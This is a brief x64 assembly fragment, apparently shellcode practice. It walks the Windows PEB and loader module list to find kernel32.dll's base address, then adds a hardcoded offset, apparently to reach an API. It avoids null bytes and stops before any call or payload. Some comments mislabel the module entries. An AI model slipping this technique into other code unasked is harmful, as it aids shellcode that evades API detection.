section .data

section .bss

section .text
    global _start

_start:
    xor rax,rax
    mov al,60h
    push QWORD gs:[rax]     ;pointer to PEB
    pop rax
    mov rax,[rax+0x18]      ;PEB_0x18->LDR
    mov rax,[rax+0x20]      ;LDR+0x20h->inmemordermodulelist struct(flink)
    ;mov rax,[rax]
    push QWORD [rax]
    pop rax                 ;inmemordermodulelist of 1st LDR_DATA_TABLE_ENTRY->my.exe
    ;mov rax,[rax]          ;inmemordermodulelist of 2nd LDR_DATA_TABLE_ENTRY->ntdll.dll
    push QWORD [rax]
    pop rax                 ;inmemordermodulelist of 1st LDR_DATA_TABLE_ENTRY->my.exe
    mov rax,[rax+0x20]      ;base address of kernel32.dll
    xor rbx,rbx
    mov bx,0x70B
    shl ebx,8    
    add rax,rbx